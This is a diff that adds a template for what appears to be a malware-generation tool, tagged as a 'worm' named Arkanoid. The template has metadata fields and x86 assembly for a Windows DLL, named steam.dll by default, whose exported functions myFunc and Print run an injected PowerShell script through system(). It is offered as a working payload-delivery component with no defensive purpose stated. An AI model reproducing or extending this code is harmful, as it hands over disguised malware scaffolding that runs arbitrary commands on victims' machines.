@@ -1,0 +1,48 @@
+#!name##Arkanoid
+#!types##worm
+#!info##Creates a DLL library (win32) containing a payload that is triggered from second EXE file as a function. You can also create another program yourself that uses this library. You can see an example use of function in “.asm” file.
+#!lang##asm
+#!system_FLAG##[W]
+#!processWorm##BasicDLL
+#!reqVar##_DLL_NAME##DLL file name##str
+#!setVar##_DLL_NAME##steam.dll##str
+#!setVar##_DLL_FUNC_myFunc##myFunc##str
+#!setVar##_DLL_FUNC_f2##Print##str
+#!reqPayload##ARK_script##PowerShell script to execute
+#!payStep##asm_stack_build
+#!payloadOpt##ARK_script##asm_stack_build_cmd##powershell.exe -Command "$"
+#!banned##module##starter##shadow##junk
+
+extern _system
+extern _ExitProcess@4
+
+section .data
+
+section .text
+    global _myFunc
+    global _Print
+    global DllMain
+
+
+DllMain:
+    mov eax, 1
+    ret
+
+_efunc:
+    push dword 0x00000000
+    {{ARK_script}}
+    push esp
+    call _system
+    ret
+
+_myFunc:
+    xor eax, eax
+    mov eax, ebx
+    call _efunc
+    ret
+
+_Print:
+    xor ebx, ebx
+    xor eax, eax
+    call _efunc
+    ret
